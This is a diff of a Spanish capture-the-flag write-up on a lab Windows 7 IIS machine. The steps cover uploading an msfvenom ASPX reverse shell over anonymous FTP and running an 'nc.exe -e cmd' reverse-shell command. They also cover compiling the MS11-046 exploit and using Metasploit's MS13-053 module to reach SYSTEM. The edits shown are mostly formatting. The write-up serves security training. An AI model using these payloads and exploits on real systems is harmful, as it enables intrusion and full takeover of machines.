@@ -19,8 +19,8 @@ tags:
   - Reverse Shell
   - Abusing IIS Service
   - Local Privilege Escalation (LPE)
-  - LPE - MS11-046
-  - LPE - MS13-053
+  - Privesc - MS11-046 (LPE)
+  - Privesc - MS13-053 (LPE)
   - OSCP Style
   - Metasploit Framework
 ---
@@ -29,6 +29,7 @@ tags:
 Una máquina bastante sencilla, en la cual usaremos el **servicio FTP** para cargar un **Payload** que contendrá una **Reverse Shell** que se activará en el **servicio HTTP** que corre el **servicio IIS** y después escalaremos privilegios usando el **Exploit MS11-046**.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *ftp*
 * *wappalizer*
@@ -38,7 +39,11 @@ Herramientas utilizadas:
 * *rlwrap*
 * *i686-w64-mingw32-gcc*
 * *impacket*
-* *msfconsole*
+* *smbserver.py*
+* *metasploit framework(msfconsole)*
+* *Módulo: exploit/multi/handler*
+* *Módulo: post/multi/recon/local_exploit_suggester*
+* *Módulo: exploit/windows/local/ms13_053_schlamperei*
 * *meterpreter*
 * *nc.exe*
 
@@ -63,7 +68,7 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#Payload">Configurando un Payload de Reverse Shell</a></li>
+				<li><a href="#Payload">Ganando Acceso a la Máquina Víctima con Reverse Shell y Archivo cmd.aspx de Kali</a></li>
 				<ul>
                                         <li><a href="#Msfvenom">Configurando el Payload de Reverse Shell con Msfvenom</a></li>
 					<li><a href="#Netcat">Utilizando una cmd.aspx de Kali</a></li>
@@ -71,17 +76,14 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#Windows">Enumeración de Windows</a></li>
+				<li><a href="#Windows">Enumeración de Máquina Víctima</a></li>
 				<li><a href="#Exploit">Buscando, Configurando y Activando un Exploit para Windows 7</a></li>
 				<ul>
                                 	<li><a href="#PruebaExp">Probando Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)</a></li>
                         	</ul>
-			</ul>
-		<li><a href="#Otras">Otras Formas</a></li>
-			<ul>
 				<li><a href="#Exploit2">Ganando Acceso y Escalando Privilegios con Metasploit</a></li>
 				<ul>
-					<li><a href="#Suggester">Usando Modulo local_exploit_suggester</a></li>
+					<li><a href="#Suggester">Usando Módulo de Metasploit para Encontrar Vulnerabilidades dentro de la Máquina Víctima</a></li>
 					<li><a href="#MS13">Usando Exploit MS13-053 schlamperei</a></li>
 				</ul>
 			</ul>
@@ -90,16 +92,11 @@ Herramientas utilizadas:
 </div>
 
 
-
-
 <br>
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -201,17 +198,14 @@ Vemos que en el **servicio FTP** tenemos activado el login como **anonymous**, v
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
 
 <h2 id="FTP">Enumeración Servicio FTP</h2>
 
-```bash
+```batch
 ftp 10.10.10.5  
 Connected to 10.10.10.5.
 220 Microsoft FTP Service
@@ -231,7 +225,7 @@ ftp> ls
 Pues no hay mucho que podamos usar, pero de acuerdo a lo que esta almacenado en el **servicio FTP**, nos damos cuenta que se esta almacenando la aplicación web **ASP.NET**, esto porque vemos el directorio **aspnet_client**, que debe estar ejecutando dicha aplicación. Además, podemos ver un archvio **.htm** y un **PNG**, que supongo pertenecen a la página web.
 
 Veamos que hay dentro del **directorio aspnet_client**:
-```bash
+```batch
 ftp> cd aspnet_client
 250 CWD command successful.
 ftp> ls
@@ -278,7 +272,7 @@ whoami > test.txt
 ```
 
 Y lo intentamos subir al **servicio FTP**:
-```bash
+```batch
 ftp 10.10.10.5
 Connected to 10.10.10.5.
 220 Microsoft FTP Service
@@ -340,13 +334,13 @@ Hay que investigar un poco sobre el **servicio IIS**.
 <br>
 
 De acuerdo con el siguiente link de la página **HackTricks**: 
-* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
+* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services" target="_blank">HackTricks: IIS - Internet Information Services</a>
 
 El **servicio IIS** puede ejecutar las siguientes extensiones:
-* asp
-* aspx
-* config
-* php
+* *asp*
+* *aspx*
+* *config*
+* *php*
 
 De momento vamos a descartar la de **PHP** y el de **config** porque no creo que nos sirvan para cargar el Payload, así que vamos a investigar la **extensión ASP y ASPX**:
 
@@ -369,19 +363,17 @@ Entonces, la **extensión ASP** podría decirse que es la página web y la **ext
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
 
-<h2 id="Payload">Configurando un Payload de Reverse Shell</h2>
+<h2 id="Payload">Ganando Acceso a la Máquina Víctima con Reverse Shell y Archivo cmd.aspx de Kali</h2>
 
 Para este caso, tenemos dos opciones, la primera es crear nuestra **Reverse Shell** con **Msfvenom** o la otra es ocupar un recurso con el que cuenta **Kali** que nos da una CMD que podemos usar, desde la página web. Vamos a ocupar ambos, pero empezamos creando nuestra propia **Reverse Shell**.
 
 <br>
+
 <h3 id="Msfvenom">Configurando el Payload de Reverse Shell con Msfvenom</h3>
 
 Vamos a empezar configurando un Payload con **Msfvenom** para que nos conecte a la máquina víctima, una vez sea ejecutado:
@@ -397,7 +389,7 @@ Saved as: IIS_Shell.aspx
 Así de simple es crearla.
 
 Ahora entramos al **servicio FTP**, subimos el archivo **.aspx** y comprobamos que este dentro:
-```
+```batch
 ftp 10.10.10.5
 Connected to 10.10.10.5.
 220 Microsoft FTP Service
@@ -443,7 +435,7 @@ Listo, estamos dentro:
 ```bash
 nc -nvlp 443                                    
 listening on [any] 443 ...
-connect to [10.10.14.12] from (UNKNOWN) [10.10.10.5] 49168
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.5] 49168
 Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
@@ -454,6 +446,7 @@ iis apppool\web
 Muy bien, ahora probemos con el archivo preconfigurado ASPX de Kali que nos da una **CMD** en la página web.
 
 <br>
+
 <h3 id="Netcat">Utilizando una cmd.aspx de Kali</h3>
 
 Resulta que, si requieres un archivo **.aspx** que contenga un Payload que devuelva una **CMD** en la web, existen dentro del **Kali Linux**, similar a la **nc.exe** que usamos en la **máquina Legacy**. También vamos a usar la **nc.exe**, así que descargala.
@@ -473,7 +466,8 @@ locate .aspx
 /usr/share/sqlmap/data/shell/stagers/stager.aspx_
 /usr/share/webshells/aspx/cmdasp.aspx
 ```
-Como puedes ver, hay varias opciones, pero hay 2 en particular que nos pueden servir:
+
+Como puedes ver hay varias opciones, pero hay 2 en particular que nos pueden servir:
 * *aspx_cmd.aspx*
 * *shell.aspx*
 
@@ -487,7 +481,7 @@ aspx_cmd.aspx  IIS_Shell.aspx  shell.aspx  test.txt
 ```
 
 Ahora lo subimos al **servicio FTP**:
-```bash
+```batch
 ftp 10.10.10.5
 Connected to 10.10.10.5.
 220 Microsoft FTP Service
@@ -523,7 +517,7 @@ listening on [any] 443 ...
 ```
 
 Carga la **nc.exe** en la máquina víctima en el **servicio FTP**:
-```bash
+```batch
 ftp 10.10.10.5
 Connected to 10.10.10.5.
 220 Microsoft FTP Service
@@ -536,8 +530,8 @@ ftp> put nc.exe
 ...
 ```
 
-En la **CMD** usa el siguiente comando:
-```bash
+En la **CMD** de la página web, usa el siguiente comando:
+```batch
 C:\inetpub\wwwroot\nc.exe -e cmd Tu_IP 443
 ```
 Normalmente, el **directorio inetpub** es el que contiene al **servicio FTP**.
@@ -546,7 +540,7 @@ Y listo, ya estamos conectados a la máquina víctima:
 ```bash
 rlwrap nc -nvlp 443                                    
 listening on [any] 443 ...
-connect to [10.10.14.12] from (UNKNOWN) [10.10.10.5] 49168
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.5] 49168
 Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
@@ -560,18 +554,15 @@ iis apppool\web
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
 
-<h2 id="Windows">Enumeración de Windows</h2>
+<h2 id="Windows">Enumeración de Máquina Víctima</h2>
 
 Una vez más dentro de la máquina, vamos a buscar la flag del usuario:
-```bash
+```batch
 c:\windows\system32\inetsrv>cd C:\
 cd C:\
 
@@ -593,8 +584,8 @@ dir
                5 Dir(s)   4.677.365.760 bytes free
 ```
 
-Recuerda siempre ir a la carpeta usuarios y puede estar en la de Public o en el nombre de algún usuario:
-```bash
+Recuerda siempre ir a la carpeta usuarios y puede estar en la de **Public** o en el nombre de algún usuario:
+```batch
 C:\>cd Users
 cd Users
 
@@ -619,8 +610,8 @@ cd babis
 Access is denied.
 ```
 
-No se puede, bueno vamos a ver en la de Public:
-```bash
+No se puede, bueno vamos a ver en la de **Public**:
+```batch
 C:\Users>cd Public
 cd Public
 
@@ -644,7 +635,7 @@ dir
 ```
 
 No pues no, no hay nada, entonces hay que entrar como Root para que podamos ver las flags. Vamos a buscar que podemos usar para acceder a la máquina como Root.
-```bash
+```batch
 C:\Users>cd ..
 cd ..
 
@@ -697,7 +688,7 @@ dir
 No veo nada que conozca que sea vulnerable. 
 
 Entonces, veamos con que privilegios gozamos para darnos una idea de que hacer y veamos la versión del sistema operativo que usa la máquina:
-```bash
+```batch
 C:\>whoami /priv
 whoami /priv
 
@@ -735,9 +726,9 @@ Vamos a usar ambas y luego investigaremos como ganar acceso con **Metasploit Fra
 <h2 id="Exploit">Buscando, Configurando y Activando un Exploit para Windows 7</h2>
 
 Buscando por internet, nos aparece uno en particular que es el **MS11-046** que es un **Local Privilege Escalation** y que justamente nos serviría en estos momentos. 
-Puede verlo en el siguiente link: 
 
-* https://www.exploit-db.com/exploits/40564
+Puedes verlo en el siguiente link: 
+* <a href="https://www.exploit-db.com/exploits/40564" target="_blank">Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)</a>
 
 Vamos a buscarlo con la herramienta **Searchsploit**:
 ```bash
@@ -758,6 +749,7 @@ MS11-046 - Dissecting a 0day                                                    
 Justamente lo tenemos, vamos a copiarlo y a analizarlo para saber cómo usarlo.
 
 <br>
+
 <h3 id="PruebaExp">Probando Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)</h3>
 
 Gracias al creador del Exploit, nos deja una pequeña explicación para convertir el Exploit en un ejecutable **.exe**:
@@ -779,7 +771,7 @@ Exploit notes:
 **OJO**: aquí la importancia de leer los Exploits para saber cómo funcionan o si es necesario configurarlos.
 
 Entonces vamos a usar la herramienta **i686-w64-mingw32-gcc**, si estas usando **Kali Linux** ya la deberías tener instalada, sin embargo, aquí está el link del cómo pueden instalar dicha herramienta: 
-* https://github.com/RUB-SysSec/WindowsVTV
+* <a href="https://github.com/RUB-SysSec/WindowsVTV" target="_blank">Repositorio de RUB-SysSec: i686-w64-mingw32-vtv</a>
 
 Vamos a convertir ese Exploit a un ejecutable **.exe**, recuerda que el Exploit se descargó con el nombre **40564.c**:
 ```bash
@@ -804,14 +796,14 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 ```
 
 * Para subir el Exploit debemos ir al **directorio Temp**:
-```bash
+```batch
 C:\Windows>cd /Windows/Temp
 cd /Windows/Temp
 C:\Windows\Temp>
 ```
 
 * Crearemos un directorio para guardarlo ahí:
-```bash
+```batch
 C:\Windows\Temp>mkdir AquiNoHayNingunExploit
 mkdir AquiNoHayNingunExploit
 C:\Windows\Temp>cd AquiNoHayNingunExploit
@@ -819,14 +811,14 @@ cd AquiNoHayNingunExploit
 ```
 
 * Copiamos el Exploit:
-```bash
+```batch
 C:\Windows\Temp\AquiNoHayNingunExploit>copy \\Tu_IP\smbFolder\MS11-046.exe MS11-046.exe                                            
 copy \\10.10.14.12\smbFolder\MS11-046.exe MS11-046.exe
         1 file(s) copied
 ```
 
 * Lo activamos:
-```bash
+```batch
 C:\Windows\Temp\AquiNoHayNingunExploit>.\MS11-046.exe
 .\MS11-046.exe
 c:\Windows\System32>whoami
@@ -835,19 +827,6 @@ nt authority\system
 ```
 
 Buscamos las flags y listo, con esto ya tenemos las flags de la máquina.
-
-
-<br>
-<br>
-<hr>
-<div style="position: relative;">
- <h1 id="Otras" style="text-align:center;">Otras Formas</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
-</div>
-<br>
-
 
 <h2 id="Exploit2">Ganando Acceso y Escalando Privilegios con Metasploit</h2>
 
@@ -865,7 +844,7 @@ Saved as: shell.aspx
 ```
 
 * Carga la **Reverse Shell** en el **servicio FTP**:
-```bash
+```batch
 ftp 10.10.10.5
 Connected to 10.10.10.5.
 220 Microsoft FTP Service
@@ -916,9 +895,10 @@ meterpreter >
 ```
 
 <br>
-<h3 id="Suggester">Usando Modulo local_exploit_suggester</h3>
 
-Excelente, para este caso, vamos a usar un modulo que nos dara los Exploits a los que es posible que sea vulnerable la máquina víctima:
+<h3 id="Suggester">Usando Módulo de Metasploit para Encontrar Vulnerabilidades dentro de la Máquina Víctima</h3>
+
+Excelente, para este caso, vamos a usar un módulo que nos dara los Exploits a los que es posible que sea vulnerable la máquina víctima:
 ```bash
 msf6 exploit(multi/handler) > search suggester
 
@@ -933,7 +913,7 @@ msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
 msf6 post(multi/recon/local_exploit_suggester) >
 ```
 
-Cargamos la sesión que tenemos activa y ejecutamos el modulo:
+Cargamos la sesión que tenemos activa y ejecutamos el módulo:
 ```bash
 msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
 SESSION => 1
@@ -977,16 +957,17 @@ msf6 post(multi/recon/local_exploit_suggester) > exploit
 Obviamente no podemos usar todos los Exploits, debemos investigar cada uno para saber cual es el indicado para usar. Después de investigar, nos puede servir el **Exploit ms13_053_schlamperei**, así que vamos a usarlo.
 
 <br>
+
 <h3 id="MS13">Usando Exploit MS13-053 schlamperei</h3>
 
-* Cargamos el modulo:
+* Cargamos el módulo:
 ```bash
 msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms13_053_schlamperei
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/local/ms13_053_schlamperei) >
 ```
 
-* Configuramos el modulo:
+* Configuramos el módulo:
 ```bash
 msf6 exploit(windows/local/ms13_053_schlamperei) > set SESSION 1
 SESSION => 1
@@ -1020,7 +1001,7 @@ nt authority\system
 ```
 Con esto ya hemos ganado acceso como Administador.
 
-Es posible que falle y no se genere una sesión como Administrador, pero el modulo indicara que sí funciono, entonces, si entras a la máquina puedes buscar el **proceso winlogon.exe** y migrar a este para ser Administrador.
+Es posible que falle y no se genere una sesión como **Administrador**, pero el módulo indicara que sí funciono, entonces, si entras a la máquina puedes buscar el **proceso winlogon.exe** y migrar a este para ser **Administrador**.
 ```bash
 meterpreter > ps
 
@@ -1046,11 +1027,9 @@ Con esto terminamos esta máquina y como mencione antes, prueba si puedes escala
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
+
 
 * https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#internal-ip-address-disclosure
 * https://medium.com/@kubotortech/pentesting-exploiting-ftp-cba8ec81968e
@@ -1063,3 +1042,48 @@ Con esto terminamos esta máquina y como mencione antes, prueba si puedes escala
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
